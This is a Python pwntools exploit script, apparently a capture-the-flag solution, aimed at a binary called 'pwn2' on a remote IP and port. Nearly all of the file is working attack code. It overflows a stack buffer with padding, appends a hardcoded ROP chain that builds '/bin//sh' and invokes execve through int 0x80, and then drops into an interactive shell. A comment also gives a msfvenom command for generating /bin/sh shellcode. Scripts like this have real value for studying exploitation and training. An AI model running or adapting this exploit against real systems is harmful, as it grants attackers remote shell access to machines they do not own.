#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-05-06 09:38:57
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 0
target = "./pwn2"
remote_ip = "60.191.205.81"
port = 2017
rop = roputils.ROP(target)
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	# gdb.attach(p,"b*main\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

# ROPgadget  --binary pwn2 --ropchain
def getropchain():
	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<I', 0x0806efbb) # pop edx ; ret
	p += pack('<I', 0x080eb060) # @ .data
	p += pack('<I', 0x080b89e6) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x080549bb) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806efbb) # pop edx ; ret
	p += pack('<I', 0x080eb064) # @ .data + 4
	p += pack('<I', 0x080b89e6) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x080549bb) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806efbb) # pop edx ; ret
	p += pack('<I', 0x080eb068) # @ .data + 8
	p += pack('<I', 0x080493a3) # xor eax, eax ; ret
	p += pack('<I', 0x080549bb) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481c9) # pop ebx ; ret
	p += pack('<I', 0x080eb060) # @ .data
	p += pack('<I', 0x080df1b9) # pop ecx ; ret
	p += pack('<I', 0x080eb068) # @ .data + 8
	p += pack('<I', 0x0806efbb) # pop edx ; ret
	p += pack('<I', 0x080eb068) # @ .data + 8
	p += pack('<I', 0x080493a3) # xor eax, eax ; ret
	p += pack('<I', 0x0804e7d2) # inc eax ; ret
	p += pack('<I', 0x0804e7d2) # inc eax ; ret
	p += pack('<I', 0x0804e7d2) # inc eax ; ret
	p += pack('<I', 0x0804e7d2) # inc eax ; ret
	p += pack('<I', 0x0804e7d2) # inc eax ; ret
	p += pack('<I', 0x0804e7d2) # inc eax ; ret
	p += pack('<I', 0x0804e7d2) # inc eax ; ret
	p += pack('<I', 0x0804e7d2) # inc eax ; ret
	p += pack('<I', 0x0804e7d2) # inc eax ; ret
	p += pack('<I', 0x0804e7d2) # inc eax ; ret
	p += pack('<I', 0x0804e7d2) # inc eax ; ret
	p += pack('<I', 0x0806cbb5) # int 0x80
	return p

payload = "a"*(0x3a+4)+getropchain()
ru("Data Size]")
sl(str(len(payload)))
ru("urData]")
sd(payload)

p.interactive()